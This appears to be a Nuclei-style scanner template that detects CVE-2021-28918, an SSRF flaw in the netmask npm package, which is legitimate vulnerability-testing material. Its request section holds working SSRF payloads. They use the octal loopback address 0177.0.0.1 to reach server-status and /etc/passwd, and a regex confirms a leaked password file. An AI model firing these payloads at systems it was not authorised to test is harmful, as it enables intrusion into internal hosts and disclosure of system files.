id: CVE-2021-28918
info:
  name: Netmask NPM Package - Server-Side Request Forgery
  author: johnjhacking
  severity: critical
  description: The Netmask NPM Package vulnerability (CVE-2021-28918) allows unauthenticated
    remote attackers to perform SSRF, remote file inclusion, and local file inclusion
    attacks, bypass IP filtering and potentially reach critical VPN or LAN hosts due
    to improper input validation of octal strings.
  reference:
  - https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md
  - https://github.com/advisories/GHSA-pch5-whg9-qr2r
  - https://nvd.nist.gov/vuln/detail/CVE-2021-28918
  - https://github.com/rs/node-netmask
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2021-28918
    cwe-id: CWE-20
  tags: cve,cve2021,npm,netmask,ssrf,lfi
  metadata:
    impact: The vulnerability in the Netmask NPM Package has significant impact as
      it enables remote unauthenticated attackers to perform SSRF, remote file inclusion,
      and local file inclusion attacks, bypass packages that rely on netmask to filter
      IPs, and gain access to critical VPN or LAN hosts.
    recommendation: It is recommended to update the Netmask NPM Package to its latest
      version in order to prevent remote unauthenticated attackers from performing
      SSRF, remote file inclusion, and local file inclusion attacks on critical VPN
      or LAN hosts.
requests:
- method: GET
  path:
  - '{{BaseURL}}/?url=http://0177.0.0.1/server-status'
  - '{{BaseURL}}/?host=http://0177.0.0.1/server-status'
  - '{{BaseURL}}/?file=http://0177.0.0.1/etc/passwd'
  stop-at-first-match: true
  matchers-condition: or
  matchers:
  - type: word
    part: body
    words:
    - Apache Server Status
    - Server Version
    condition: and
  - type: regex
    regex:
    - 'root:.*:0:0:'
